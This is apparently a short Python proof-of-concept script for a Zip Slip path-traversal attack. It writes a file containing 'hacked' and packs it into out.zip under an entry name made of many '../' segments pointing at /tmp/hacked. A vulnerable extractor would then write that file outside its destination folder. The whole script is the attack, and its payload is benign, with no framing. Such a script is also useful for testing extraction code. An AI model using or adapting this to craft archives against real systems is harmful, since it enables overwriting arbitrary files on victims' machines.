import os
import zipfile

output_zipfile="out.zip"
filename = "./tmp.txt"
name = "../../../../../../../../../../../../../../../../../../../../../../tmp/hacked"

if not os.path.isfile(filename):
    with open(filename, "w") as file:
        file.write("hacked")

zip_file = zipfile.ZipFile(output_zipfile, 'w')
zip_file.write(filename, name)

print("Done ~")